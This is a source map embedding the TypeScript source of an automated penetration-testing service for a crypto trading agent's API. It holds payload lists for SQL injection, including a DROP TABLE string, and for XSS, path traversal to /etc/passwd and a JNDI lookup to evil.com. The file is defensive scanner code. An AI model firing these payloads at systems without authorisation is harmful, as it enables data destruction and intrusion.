{"version":3,"names":["cov_20fguhnp3o","path","hash","global","Function","gcv","coverageData","statementMap","start","line","column","end","fnMap","name","decl","loc","branchMap","type","locations","undefined","s","f","b","inputSourceMap","file","mappings","names","sources","sourcesContent","version","_coverageSchema","coverage","actualCoverage","axios_1","__importDefault","require","crypto","__importStar","PenetrationTestingService","logger","encryptionService","threatDetection","testResults","config","constructor","executeSecurityTestSuite","startTime","Date","now","info","testPromises","runAPISecurityTests","runVulnerabilityScanning","runComplianceTests","runPenetrationTests","Promise","all","allResults","flat","report","generateVulnerabilityReport","executionTime","totalTests","length","criticalFindings","criticalCount","complianceScore","push","error","results","endpoint","targetEndpoints","testSQLInjection","testXSSVulnerabilities","testAuthenticationBypass","testRateLimiting","testInputValidation","testTLSSecurity","testId","randomUUID","findings","sqlPayloads","payload","response","sendTestRequest","input","detectSQLInjectionVulnerability","id","severity","description","location","evidence","data","toString","substring","remediation","testName","category","status","recommendations","timestamp","createErrorTestResult","xssPayloads","detectXSSVulnerability","noAuthResponse","invalidTokenResponse","Authorization","requests","Array","fill","map","catch","err","responses","rateLimitedResponses","filter","r","maliciousInputs","repeat","detectInputValidationIssue","httpEndpoint","replace","httpResponse","default","get","timeout","httpsResponse","securityHeaders","header","headers","scanDependencyVulnerabilities","scanConfigurationSecurity","scanFileSystemSecurity","packageJson","dependencies","devDependencies","pkg","Object","entries","isVulnerablePackage","configFiles","secrets","scanForHardcodedSecrets","insecureConfigs","scanForInsecureConfigurations","permissionIssues","scanFilePermissions","sensitiveFiles","scanForSensitiveFiles","standard","complianceStandards","runComplianceTest","checkOWASPCompliance","checkISO27001Compliance","checkSOC2Compliance","warn","runNetworkPenetrationTest","runApplicationPenetrationTest","runSocialEngineeringTest","openPorts","scanOpenPorts","port","isUnnecessaryPort","logicFlaws","testBusinessLogicFlaws","sessionFlaws","testSessionManagement","socialEngVulns","checkSocialEngineeringVulnerabilities","post","timeoutMs","validateStatus","indicators","responseText","toLowerCase","some","indicator","includes","errorIndicators","vulnerablePatterns","versions","pattern","secretPatterns","Math","random","key","value","riskyFiles","owaspChecks","check","iso27001Checks","soc2Checks","necessaryPorts","flaw","sessionIssues","issue","vuln","allFindings","flatMap","highCount","mediumCount","lowCount","passedTests","round","Set","scanId","totalVulnerabilities","vulnerabilities","message","stack","getTestResults","clearTestResults","exports"],"sources":["C:\\Users\\Nick\\Desktop\\SmoothSail\\src\\security\\penetration-testing-service.ts"],"sourcesContent":["/**\r\n * Penetration Testing Service\r\n * \r\n * Implements automated penetration testing for API endpoints, vulnerability scanning,\r\n * and security compliance testing for the AI crypto trading agent.\r\n * \r\n * Features:\r\n * - API endpoint security testing\r\n * - Vulnerability scanning and assessment\r\n * - Security compliance validation\r\n * - Automated security test execution\r\n */\r\n\r\nimport { Logger } from '../core/logging/logger';\r\nimport { EncryptionService } from './encryption-service';\r\nimport { ThreatDetectionEngine } from './threat-detection-engine';\r\nimport axios, { AxiosResponse } from 'axios';\r\nimport * as crypto from 'crypto';\r\n\r\nexport interface SecurityTestResult {\r\n  testId: string;\r\n  testName: string;\r\n  category: 'API_SECURITY' | 'VULNERABILITY_SCAN' | 'COMPLIANCE' | 'PENETRATION';\r\n  status: 'PASS' | 'FAIL' | 'WARNING';\r\n  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';\r\n  description: string;\r\n  findings: SecurityFinding[];\r\n  recommendations: string[];\r\n  timestamp: Date;\r\n  executionTime: number;\r\n}\r\n\r\nexport interface SecurityFinding {\r\n  id: string;\r\n  type: string;\r\n  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';\r\n  description: string;\r\n  location: string;\r\n  evidence: string;\r\n  cveId?: string;\r\n  remediation: string;\r\n}\r\n\r\nexport interface PenetrationTestConfig {\r\n  targetEndpoints: string[];\r\n  testTypes: string[];\r\n  maxConcurrentTests: number;\r\n  timeoutMs: number;\r\n  enableDestructiveTesting: boolean;\r\n  complianceStandards: string[];\r\n}\r\n\r\nexport interface VulnerabilityReport {\r\n  scanId: string;\r\n  timestamp: Date;\r\n  totalVulnerabilities: number;\r\n  criticalCount: number;\r\n  highCount: number;\r\n  mediumCount: number;\r\n  lowCount: number;\r\n  vulnerabilities: SecurityFinding[];\r\n  complianceScore: number;\r\n  recommendations: string[];\r\n}\r\n\r\nexport class PenetrationTestingService {\r\n  private logger: Logger;\r\n  private encryptionService: EncryptionService;\r\n  private threatDetection: ThreatDetectionEngine;\r\n  private testResults: SecurityTestResult[] = [];\r\n  private config: PenetrationTestConfig;\r\n\r\n  constructor(\r\n    logger: Logger,\r\n    encryptionService: EncryptionService,\r\n    threatDetection: ThreatDetectionEngine,\r\n    config: PenetrationTestConfig\r\n  ) {\r\n    this.logger = logger;\r\n    this.encryptionService = encryptionService;\r\n    this.threatDetection = threatDetection;\r\n    this.config = config;\r\n  }\r\n\r\n  /**\r\n   * Execute comprehensive security testing suite\r\n   */\r\n  async executeSecurityTestSuite(): Promise<VulnerabilityReport> {\r\n    const startTime = Date.now();\r\n    this.logger.info('Starting comprehensive security test suite execution');\r\n\r\n    try {\r\n      // Run all security tests in parallel\r\n      const testPromises = [\r\n        this.runAPISecurityTests(),\r\n        this.runVulnerabilityScanning(),\r\n        this.runComplianceTests(),\r\n        this.runPenetrationTests()\r\n      ];\r\n\r\n      const testResults = await Promise.all(testPromises);\r\n      const allResults = testResults.flat();\r\n      \r\n      // Generate comprehensive vulnerability report\r\n      const report = this.generateVulnerabilityReport(allResults);\r\n      \r\n      const executionTime = Date.now() - startTime;\r\n      this.logger.info(`Security test suite completed in ${executionTime}ms`, {\r\n        totalTests: allResults.length,\r\n        criticalFindings: report.criticalCount,\r\n        complianceScore: report.complianceScore\r\n      });\r\n\r\n      // Store results for audit trail\r\n      this.testResults.push(...allResults);\r\n\r\n      return report;\r\n    } catch (error) {\r\n      this.logger.error('Security test suite execution failed', { error });\r\n      throw error;\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Run API security tests\r\n   */\r\n  private async runAPISecurityTests(): Promise<SecurityTestResult[]> {\r\n    const results: SecurityTestResult[] = [];\r\n    \r\n    for (const endpoint of this.config.targetEndpoints) {\r\n      // SQL Injection Testing\r\n      results.push(await this.testSQLInjection(endpoint));\r\n      \r\n      // XSS Testing\r\n      results.push(await this.testXSSVulnerabilities(endpoint));\r\n      \r\n      // Authentication Bypass Testing\r\n      results.push(await this.testAuthenticationBypass(endpoint));\r\n      \r\n      // Rate Limiting Testing\r\n      results.push(await this.testRateLimiting(endpoint));\r\n      \r\n      // Input Validation Testing\r\n      results.push(await this.testInputValidation(endpoint));\r\n      \r\n      // HTTPS/TLS Testing\r\n      results.push(await this.testTLSSecurity(endpoint));\r\n    }\r\n\r\n    return results;\r\n  }\r\n\r\n  /**\r\n   * Test for SQL injection vulnerabilities\r\n   */\r\n  private async testSQLInjection(endpoint: string): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    const sqlPayloads = [\r\n      \"' OR '1'='1\",\r\n      \"'; DROP TABLE users; --\",\r\n      \"' UNION SELECT * FROM users --\",\r\n      \"1' AND (SELECT COUNT(*) FROM users) > 0 --\"\r\n    ];\r\n\r\n    try {\r\n      for (const payload of sqlPayloads) {\r\n        const response = await this.sendTestRequest(endpoint, { input: payload });\r\n        \r\n        if (this.detectSQLInjectionVulnerability(response)) {\r\n          findings.push({\r\n            id: crypto.randomUUID(),\r\n            type: 'SQL_INJECTION',\r\n            severity: 'CRITICAL',\r\n            description: `SQL injection vulnerability detected with payload: ${payload}`,\r\n            location: endpoint,\r\n            evidence: response.data?.toString().substring(0, 500) || '',\r\n            remediation: 'Implement parameterized queries and input sanitization'\r\n          });\r\n        }\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: 'SQL Injection Test',\r\n        category: 'API_SECURITY',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'CRITICAL' : 'LOW',\r\n        description: 'Tests for SQL injection vulnerabilities in API endpoints',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Use parameterized queries',\r\n          'Implement input validation',\r\n          'Apply principle of least privilege to database connections'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('SQL injection test failed', { endpoint, error });\r\n      return this.createErrorTestResult(testId, 'SQL Injection Test', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Test for XSS vulnerabilities\r\n   */\r\n  private async testXSSVulnerabilities(endpoint: string): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    const xssPayloads = [\r\n      \"<script>alert('XSS')</script>\",\r\n      \"javascript:alert('XSS')\",\r\n      \"<img src=x onerror=alert('XSS')>\",\r\n      \"';alert('XSS');//\"\r\n    ];\r\n\r\n    try {\r\n      for (const payload of xssPayloads) {\r\n        const response = await this.sendTestRequest(endpoint, { input: payload });\r\n        \r\n        if (this.detectXSSVulnerability(response, payload)) {\r\n          findings.push({\r\n            id: crypto.randomUUID(),\r\n            type: 'XSS',\r\n            severity: 'HIGH',\r\n            description: `XSS vulnerability detected with payload: ${payload}`,\r\n            location: endpoint,\r\n            evidence: response.data?.toString().substring(0, 500) || '',\r\n            remediation: 'Implement output encoding and Content Security Policy'\r\n          });\r\n        }\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: 'XSS Vulnerability Test',\r\n        category: 'API_SECURITY',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'HIGH' : 'LOW',\r\n        description: 'Tests for Cross-Site Scripting vulnerabilities',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Implement output encoding',\r\n          'Use Content Security Policy headers',\r\n          'Validate and sanitize all user inputs'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('XSS test failed', { endpoint, error });\r\n      return this.createErrorTestResult(testId, 'XSS Vulnerability Test', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Test authentication bypass vulnerabilities\r\n   */\r\n  private async testAuthenticationBypass(endpoint: string): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // Test without authentication\r\n      const noAuthResponse = await this.sendTestRequest(endpoint, {}, {});\r\n      \r\n      if (noAuthResponse.status === 200) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'AUTH_BYPASS',\r\n          severity: 'CRITICAL',\r\n          description: 'Endpoint accessible without authentication',\r\n          location: endpoint,\r\n          evidence: `HTTP ${noAuthResponse.status} response received`,\r\n          remediation: 'Implement proper authentication checks'\r\n        });\r\n      }\r\n\r\n      // Test with invalid tokens\r\n      const invalidTokenResponse = await this.sendTestRequest(\r\n        endpoint, \r\n        {}, \r\n        { Authorization: 'Bearer invalid_token_12345' }\r\n      );\r\n      \r\n      if (invalidTokenResponse.status === 200) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'AUTH_BYPASS',\r\n          severity: 'CRITICAL',\r\n          description: 'Endpoint accepts invalid authentication tokens',\r\n          location: endpoint,\r\n          evidence: `HTTP ${invalidTokenResponse.status} with invalid token`,\r\n          remediation: 'Implement proper token validation'\r\n        });\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: 'Authentication Bypass Test',\r\n        category: 'API_SECURITY',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'CRITICAL' : 'LOW',\r\n        description: 'Tests for authentication bypass vulnerabilities',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Implement robust authentication mechanisms',\r\n          'Validate all authentication tokens',\r\n          'Use secure session management'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('Authentication bypass test failed', { endpoint, error });\r\n      return this.createErrorTestResult(testId, 'Authentication Bypass Test', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Test rate limiting implementation\r\n   */\r\n  private async testRateLimiting(endpoint: string): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // Send rapid requests to test rate limiting\r\n      const requests = Array(100).fill(null).map(() => \r\n        this.sendTestRequest(endpoint, {}).catch(err => ({ status: err.response?.status || 0 }))\r\n      );\r\n\r\n      const responses = await Promise.all(requests);\r\n      const rateLimitedResponses = responses.filter(r => r.status === 429);\r\n\r\n      if (rateLimitedResponses.length === 0) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'RATE_LIMITING',\r\n          severity: 'MEDIUM',\r\n          description: 'No rate limiting detected on endpoint',\r\n          location: endpoint,\r\n          evidence: `${responses.length} requests sent, 0 rate limited`,\r\n          remediation: 'Implement rate limiting to prevent abuse'\r\n        });\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: 'Rate Limiting Test',\r\n        category: 'API_SECURITY',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'MEDIUM' : 'LOW',\r\n        description: 'Tests for proper rate limiting implementation',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Implement rate limiting middleware',\r\n          'Use sliding window or token bucket algorithms',\r\n          'Return appropriate HTTP 429 responses'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('Rate limiting test failed', { endpoint, error });\r\n      return this.createErrorTestResult(testId, 'Rate Limiting Test', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Test input validation\r\n   */\r\n  private async testInputValidation(endpoint: string): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    const maliciousInputs = [\r\n      '../../../etc/passwd',\r\n      '${jndi:ldap://evil.com/a}',\r\n      '{{7*7}}',\r\n      '<script>alert(1)</script>',\r\n      'A'.repeat(10000) // Buffer overflow test\r\n    ];\r\n\r\n    try {\r\n      for (const input of maliciousInputs) {\r\n        const response = await this.sendTestRequest(endpoint, { data: input });\r\n        \r\n        if (response.status === 500 || this.detectInputValidationIssue(response)) {\r\n          findings.push({\r\n            id: crypto.randomUUID(),\r\n            type: 'INPUT_VALIDATION',\r\n            severity: 'HIGH',\r\n            description: `Input validation issue detected with input: ${input.substring(0, 50)}`,\r\n            location: endpoint,\r\n            evidence: response.data?.toString().substring(0, 500) || '',\r\n            remediation: 'Implement comprehensive input validation and sanitization'\r\n          });\r\n        }\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: 'Input Validation Test',\r\n        category: 'API_SECURITY',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'HIGH' : 'LOW',\r\n        description: 'Tests for proper input validation',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Implement strict input validation',\r\n          'Use allowlist validation approach',\r\n          'Sanitize all user inputs'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('Input validation test failed', { endpoint, error });\r\n      return this.createErrorTestResult(testId, 'Input Validation Test', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Test TLS/HTTPS security\r\n   */\r\n  private async testTLSSecurity(endpoint: string): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // Test if HTTP version is accessible\r\n      const httpEndpoint = endpoint.replace('https://', 'http://');\r\n      \r\n      try {\r\n        const httpResponse = await axios.get(httpEndpoint, { timeout: 5000 });\r\n        if (httpResponse.status === 200) {\r\n          findings.push({\r\n            id: crypto.randomUUID(),\r\n            type: 'TLS_SECURITY',\r\n            severity: 'HIGH',\r\n            description: 'Endpoint accessible over unencrypted HTTP',\r\n            location: httpEndpoint,\r\n            evidence: `HTTP ${httpResponse.status} response received`,\r\n            remediation: 'Enforce HTTPS-only access with HSTS headers'\r\n          });\r\n        }\r\n      } catch (error) {\r\n        // HTTP not accessible is good\r\n      }\r\n\r\n      // Test HTTPS configuration\r\n      const httpsResponse = await axios.get(endpoint, { timeout: 5000 });\r\n      \r\n      // Check for security headers\r\n      const securityHeaders = [\r\n        'strict-transport-security',\r\n        'x-content-type-options',\r\n        'x-frame-options',\r\n        'x-xss-protection'\r\n      ];\r\n\r\n      for (const header of securityHeaders) {\r\n        if (!httpsResponse.headers[header]) {\r\n          findings.push({\r\n            id: crypto.randomUUID(),\r\n            type: 'SECURITY_HEADERS',\r\n            severity: 'MEDIUM',\r\n            description: `Missing security header: ${header}`,\r\n            location: endpoint,\r\n            evidence: `Header ${header} not present in response`,\r\n            remediation: `Add ${header} security header`\r\n          });\r\n        }\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: 'TLS Security Test',\r\n        category: 'API_SECURITY',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'HIGH' : 'LOW',\r\n        description: 'Tests for proper TLS/HTTPS security configuration',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Enforce HTTPS-only access',\r\n          'Implement HSTS headers',\r\n          'Add comprehensive security headers'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('TLS security test failed', { endpoint, error });\r\n      return this.createErrorTestResult(testId, 'TLS Security Test', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Run vulnerability scanning\r\n   */\r\n  private async runVulnerabilityScanning(): Promise<SecurityTestResult[]> {\r\n    const results: SecurityTestResult[] = [];\r\n    \r\n    // Dependency vulnerability scanning\r\n    results.push(await this.scanDependencyVulnerabilities());\r\n    \r\n    // Configuration security scanning\r\n    results.push(await this.scanConfigurationSecurity());\r\n    \r\n    // File system security scanning\r\n    results.push(await this.scanFileSystemSecurity());\r\n\r\n    return results;\r\n  }\r\n\r\n  /**\r\n   * Scan for dependency vulnerabilities\r\n   */\r\n  private async scanDependencyVulnerabilities(): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // This would integrate with npm audit or similar tools\r\n      // For now, we'll simulate the scanning process\r\n      \r\n      const packageJson = require('../../package.json');\r\n      const dependencies = { ...packageJson.dependencies, ...packageJson.devDependencies };\r\n\r\n      // Simulate vulnerability detection\r\n      for (const [pkg, version] of Object.entries(dependencies)) {\r\n        if (this.isVulnerablePackage(pkg as string, version as string)) {\r\n          findings.push({\r\n            id: crypto.randomUUID(),\r\n            type: 'DEPENDENCY_VULNERABILITY',\r\n            severity: 'HIGH',\r\n            description: `Vulnerable dependency detected: ${pkg}@${version}`,\r\n            location: 'package.json',\r\n            evidence: `Package ${pkg} version ${version} has known vulnerabilities`,\r\n            remediation: `Update ${pkg} to latest secure version`\r\n          });\r\n        }\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: 'Dependency Vulnerability Scan',\r\n        category: 'VULNERABILITY_SCAN',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'HIGH' : 'LOW',\r\n        description: 'Scans for vulnerabilities in project dependencies',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Update vulnerable dependencies',\r\n          'Use npm audit to check for vulnerabilities',\r\n          'Implement automated dependency scanning in CI/CD'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('Dependency vulnerability scan failed', { error });\r\n      return this.createErrorTestResult(testId, 'Dependency Vulnerability Scan', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Scan configuration security\r\n   */\r\n  private async scanConfigurationSecurity(): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // Check for hardcoded secrets\r\n      const configFiles = ['.env', '.env.example', 'src/config/'];\r\n      \r\n      for (const file of configFiles) {\r\n        const secrets = await this.scanForHardcodedSecrets(file);\r\n        findings.push(...secrets);\r\n      }\r\n\r\n      // Check for insecure configurations\r\n      const insecureConfigs = await this.scanForInsecureConfigurations();\r\n      findings.push(...insecureConfigs);\r\n\r\n      return {\r\n        testId,\r\n        testName: 'Configuration Security Scan',\r\n        category: 'VULNERABILITY_SCAN',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'HIGH' : 'LOW',\r\n        description: 'Scans for security issues in configuration files',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Remove hardcoded secrets',\r\n          'Use environment variables for sensitive data',\r\n          'Implement secure configuration management'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('Configuration security scan failed', { error });\r\n      return this.createErrorTestResult(testId, 'Configuration Security Scan', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Scan file system security\r\n   */\r\n  private async scanFileSystemSecurity(): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // Check file permissions\r\n      const permissionIssues = await this.scanFilePermissions();\r\n      findings.push(...permissionIssues);\r\n\r\n      // Check for sensitive files\r\n      const sensitiveFiles = await this.scanForSensitiveFiles();\r\n      findings.push(...sensitiveFiles);\r\n\r\n      return {\r\n        testId,\r\n        testName: 'File System Security Scan',\r\n        category: 'VULNERABILITY_SCAN',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'MEDIUM' : 'LOW',\r\n        description: 'Scans for file system security issues',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Fix file permission issues',\r\n          'Remove or secure sensitive files',\r\n          'Implement proper access controls'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('File system security scan failed', { error });\r\n      return this.createErrorTestResult(testId, 'File System Security Scan', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Run compliance tests\r\n   */\r\n  private async runComplianceTests(): Promise<SecurityTestResult[]> {\r\n    const results: SecurityTestResult[] = [];\r\n    \r\n    for (const standard of this.config.complianceStandards) {\r\n      results.push(await this.runComplianceTest(standard));\r\n    }\r\n\r\n    return results;\r\n  }\r\n\r\n  /**\r\n   * Run specific compliance test\r\n   */\r\n  private async runComplianceTest(standard: string): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      switch (standard) {\r\n        case 'OWASP_TOP_10':\r\n          findings.push(...await this.checkOWASPCompliance());\r\n          break;\r\n        case 'ISO_27001':\r\n          findings.push(...await this.checkISO27001Compliance());\r\n          break;\r\n        case 'SOC_2':\r\n          findings.push(...await this.checkSOC2Compliance());\r\n          break;\r\n        default:\r\n          this.logger.warn(`Unknown compliance standard: ${standard}`);\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: `${standard} Compliance Test`,\r\n        category: 'COMPLIANCE',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'HIGH' : 'LOW',\r\n        description: `Tests compliance with ${standard} standard`,\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          `Address ${standard} compliance gaps`,\r\n          'Implement required security controls',\r\n          'Document compliance procedures'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error(`${standard} compliance test failed`, { error });\r\n      return this.createErrorTestResult(testId, `${standard} Compliance Test`, error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Run penetration tests\r\n   */\r\n  private async runPenetrationTests(): Promise<SecurityTestResult[]> {\r\n    const results: SecurityTestResult[] = [];\r\n    \r\n    // Network penetration testing\r\n    results.push(await this.runNetworkPenetrationTest());\r\n    \r\n    // Application penetration testing\r\n    results.push(await this.runApplicationPenetrationTest());\r\n    \r\n    // Social engineering simulation\r\n    results.push(await this.runSocialEngineeringTest());\r\n\r\n    return results;\r\n  }\r\n\r\n  /**\r\n   * Run network penetration test\r\n   */\r\n  private async runNetworkPenetrationTest(): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // Port scanning simulation\r\n      const openPorts = await this.scanOpenPorts();\r\n      \r\n      for (const port of openPorts) {\r\n        if (this.isUnnecessaryPort(port)) {\r\n          findings.push({\r\n            id: crypto.randomUUID(),\r\n            type: 'NETWORK_SECURITY',\r\n            severity: 'MEDIUM',\r\n            description: `Unnecessary port ${port} is open`,\r\n            location: `Network port ${port}`,\r\n            evidence: `Port ${port} responds to connections`,\r\n            remediation: `Close unnecessary port ${port} or implement proper access controls`\r\n          });\r\n        }\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: 'Network Penetration Test',\r\n        category: 'PENETRATION',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'MEDIUM' : 'LOW',\r\n        description: 'Tests network security through penetration testing',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Close unnecessary ports',\r\n          'Implement network segmentation',\r\n          'Use firewalls and access controls'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('Network penetration test failed', { error });\r\n      return this.createErrorTestResult(testId, 'Network Penetration Test', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Run application penetration test\r\n   */\r\n  private async runApplicationPenetrationTest(): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // Business logic testing\r\n      const logicFlaws = await this.testBusinessLogicFlaws();\r\n      findings.push(...logicFlaws);\r\n\r\n      // Session management testing\r\n      const sessionFlaws = await this.testSessionManagement();\r\n      findings.push(...sessionFlaws);\r\n\r\n      return {\r\n        testId,\r\n        testName: 'Application Penetration Test',\r\n        category: 'PENETRATION',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'HIGH' : 'LOW',\r\n        description: 'Tests application security through penetration testing',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Fix business logic flaws',\r\n          'Implement secure session management',\r\n          'Add comprehensive security testing'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('Application penetration test failed', { error });\r\n      return this.createErrorTestResult(testId, 'Application Penetration Test', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Run social engineering test\r\n   */\r\n  private async runSocialEngineeringTest(): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // This would be a simulated test in a real environment\r\n      // For now, we'll check for common social engineering vulnerabilities\r\n      \r\n      const socialEngVulns = await this.checkSocialEngineeringVulnerabilities();\r\n      findings.push(...socialEngVulns);\r\n\r\n      return {\r\n        testId,\r\n        testName: 'Social Engineering Test',\r\n        category: 'PENETRATION',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'MEDIUM' : 'LOW',\r\n        description: 'Tests for social engineering vulnerabilities',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Implement security awareness training',\r\n          'Add multi-factor authentication',\r\n          'Create incident response procedures'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('Social engineering test failed', { error });\r\n      return this.createErrorTestResult(testId, 'Social Engineering Test', error);\r\n    }\r\n  }\r\n\r\n  // Helper methods for testing\r\n\r\n  private async sendTestRequest(\r\n    endpoint: string, \r\n    data: any = {}, \r\n    headers: any = {}\r\n  ): Promise<AxiosResponse> {\r\n    try {\r\n      return await axios.post(endpoint, data, { \r\n        headers,\r\n        timeout: this.config.timeoutMs,\r\n        validateStatus: () => true // Don't throw on HTTP errors\r\n      });\r\n    } catch (error: any) {\r\n      return {\r\n        status: error.response?.status || 0,\r\n        data: error.response?.data || '',\r\n        headers: error.response?.headers || {}\r\n      } as AxiosResponse;\r\n    }\r\n  }\r\n\r\n  private detectSQLInjectionVulnerability(response: AxiosResponse): boolean {\r\n    const indicators = [\r\n      'SQL syntax error',\r\n      'mysql_fetch_array',\r\n      'ORA-00933',\r\n      'Microsoft OLE DB Provider',\r\n      'unclosed quotation mark'\r\n    ];\r\n    \r\n    const responseText = response.data?.toString().toLowerCase() || '';\r\n    return 